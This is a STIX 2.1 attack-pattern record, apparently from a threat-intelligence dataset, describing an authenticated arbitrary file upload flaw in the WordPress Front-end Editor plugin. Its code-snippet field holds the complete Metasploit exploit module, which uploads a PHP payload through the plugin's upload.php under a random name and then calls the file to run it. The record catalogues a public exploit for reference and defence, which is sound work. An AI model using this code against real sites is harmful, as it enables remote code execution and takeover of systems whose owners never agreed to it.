{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--93fff4ba-297f-41fb-9bd4-16ab17773593",
    "created": "2024-08-14T17:12:03.940108Z",
    "modified": "2024-08-14T17:12:03.940112Z",
    "name": "Wordpress Front-end Editor File Upload",
    "description": " The WordPress Front-end Editor plugin contains an authenticated file upload vulnerability. An attacker can upload arbitrary files to the upload folder because the plugin uses its own file upload mechanism instead of the WordPress API, which incorrectly allows uploads of any file type. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/wp_frontend_editor_file_upload.rb",
            "external_id": "wp_frontend_editor_file_upload.rb"
        },
        {
            "source_name": "WPVDB",
            "external_id": "7569"
        },
        {
            "source_name": "reference",
            "url": "http://www.opensyscom.fr/Actualites/wordpress-plugins-front-end-editor-arbitrary-file-upload-vulnerability.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HTTP::Wordpress\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(\n      info,\n      'Name'           => 'Wordpress Front-end Editor File Upload',\n      'Description'    => %q{\n          The WordPress Front-end Editor plugin contains an authenticated file upload\n          vulnerability. An attacker can upload arbitrary files to the upload folder because\n          the plugin uses its own file upload mechanism instead of the WordPress API, which\n          incorrectly allows uploads of any file type.\n      },\n      'Author'         =>\n        [\n          'Sammy', # Vulnerability discovery\n          'Roberto Soares Espreto <robertoespreto[at]gmail.com>'     # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['OSVDB', '83637'],\n          ['WPVDB', '7569'],\n          ['URL', 'http://www.opensyscom.fr/Actualites/wordpress-plugins-front-end-editor-arbitrary-file-upload-vulnerability.html']\n        ],\n      'Privileged'     => false,\n      'Platform'       => ['php'],\n      'Arch'           => ARCH_PHP,\n      'Targets'        => [['Front-End Editor 2.2.1', {}]],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2012-07-04'))\n  end\n\n  def check\n    check_plugin_version_from_readme('front-end-editor', '2.3')\n  end\n\n  def exploit\n    print_status(\"Trying to upload payload\")\n    filename = \"#{rand_text_alpha_lower(5)}.php\"\n\n    print_status(\"Uploading payload\")\n    res = send_request_cgi(\n      'method'   => 'POST',\n      'uri'      => normalize_uri(wordpress_url_plugins, 'front-end-editor', 'lib', 'aloha-editor', 'plugins', 'extra', 'draganddropfiles', 'demo', 'upload.php'),\n      'ctype'    => 'application/octet-stream',\n      'headers'  => {\n        'X-File-Name' => \"#{filename}\"\n      },\n      'data' => payload.encoded\n    )\n\n    if res\n      if res.code == 200\n        register_files_for_cleanup(filename)\n      else\n        fail_with(Failure::Unknown, \"#{peer} - Unexpected response, exploit probably failed!\")\n      end\n    else\n      fail_with(Failure::Unknown, 'Server did not respond in an expected way')\n    end\n\n    print_status(\"Calling uploaded file #{filename}\")\n    send_request_cgi(\n      { 'uri'    => normalize_uri(wordpress_url_plugins, 'front-end-editor', 'lib', 'aloha-editor', 'plugins', 'extra', 'draganddropfiles', 'demo', \"#{filename}\") },\n      5\n    )\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-07-04",
    "x_mitre_platforms": [
        "['php']"
    ]
}